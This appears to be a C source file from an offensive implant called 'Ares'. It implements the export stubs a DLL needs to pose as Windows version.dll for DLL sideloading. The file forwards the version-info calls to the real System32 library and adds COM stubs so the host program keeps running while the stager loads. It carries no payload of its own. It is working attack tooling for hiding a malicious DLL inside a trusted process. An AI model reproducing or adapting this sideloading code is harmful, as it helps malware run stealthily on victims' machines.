/* version_stubs.c — DLL export stubs for version.dll sideloading
 *
 * When Ares DLL masquerades as version.dll, the host EXE may call
 * GetFileVersionInfoW etc. These stubs forward to the real version.dll
 * to prevent crashes.
 */

#ifdef ARES_DLL_STAGER

#include <windows.h>

/* Real version.dll handle — loaded on first call */
static HMODULE g_real_version = NULL;

static HMODULE _get_real_version(void) {
    if (!g_real_version) {
        /* Load from System32 explicitly to avoid recursion */
        char sys32[MAX_PATH];
        GetSystemDirectoryA(sys32, MAX_PATH);
        lstrcatA(sys32, "\\version.dll");
        g_real_version = LoadLibraryA(sys32);
    }
    return g_real_version;
}

/* Forwarded exports — these match what version.dll normally provides */

__declspec(dllexport)
BOOL WINAPI GetFileVersionInfoW(LPCWSTR lptstrFilename, DWORD dwHandle,
    DWORD dwLen, LPVOID lpData) {
    typedef BOOL (WINAPI *fn_t)(LPCWSTR, DWORD, DWORD, LPVOID);
    HMODULE h = _get_real_version();
    if (!h) return FALSE;
    fn_t fn = (fn_t)GetProcAddress(h, "GetFileVersionInfoW");
    if (!fn) return FALSE;
    return fn(lptstrFilename, dwHandle, dwLen, lpData);
}

__declspec(dllexport)
DWORD WINAPI GetFileVersionInfoSizeW(LPCWSTR lptstrFilename, LPDWORD lpdwHandle) {
    typedef DWORD (WINAPI *fn_t)(LPCWSTR, LPDWORD);
    HMODULE h = _get_real_version();
    if (!h) return 0;
    fn_t fn = (fn_t)GetProcAddress(h, "GetFileVersionInfoSizeW");
    if (!fn) return 0;
    return fn(lptstrFilename, lpdwHandle);
}

__declspec(dllexport)
BOOL WINAPI VerQueryValueW(LPCVOID pBlock, LPCWSTR lpSubBlock,
    LPVOID *lplpBuffer, PUINT puLen) {
    typedef BOOL (WINAPI *fn_t)(LPCVOID, LPCWSTR, LPVOID*, PUINT);
    HMODULE h = _get_real_version();
    if (!h) return FALSE;
    fn_t fn = (fn_t)GetProcAddress(h, "VerQueryValueW");
    if (!fn) return FALSE;
    return fn(pBlock, lpSubBlock, lplpBuffer, puLen);
}

/* COM stubs — match exact SDK signatures from combaseapi.h */
#include <unknwn.h>

__declspec(dllexport)
HRESULT WINAPI DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID *ppv) {
    (void)rclsid; (void)riid;
    if (ppv) *ppv = NULL;
    return 0x80040111L; /* CLASS_E_CLASSNOTAVAILABLE */
}

__declspec(dllexport)
HRESULT WINAPI DllCanUnloadNow(void) {
    return 1; /* S_FALSE */
}

#endif /* ARES_DLL_STAGER */
